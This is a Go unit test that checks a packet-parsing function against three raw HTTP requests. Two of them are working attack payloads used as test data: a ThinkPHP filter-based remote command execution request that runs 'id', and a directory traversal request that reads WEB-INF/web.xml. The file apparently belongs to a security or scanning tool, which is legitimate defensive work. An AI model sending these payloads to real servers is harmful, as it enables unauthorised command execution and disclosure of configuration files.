package utils

import (
	"github.com/davecgh/go-spew/spew"
	"testing"
)

func TestPacket(t *testing.T) {
	packet1 := "POST /index.php?s=captcha HTTP/1.1\nHost: 172.20.254.128:8080\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nUpgrade-Insecure-Requests: 1\n\n_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id"
	spew.Dump(ParsePacket(packet1))
	packet2 := "GET /readfile?filename=../../../../../../../WEB-INF/web.xml HTTP/1.1\nHost: 8.130.55.185:51180\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
	spew.Dump(ParsePacket(packet2))
	packet3 := "POST / HTTP/1.1\nContent-Type: application/json\nHost: www.example.com\n\n{\"key\": \"value\"}"
	spew.Dump(ParsePacket(packet3))

}
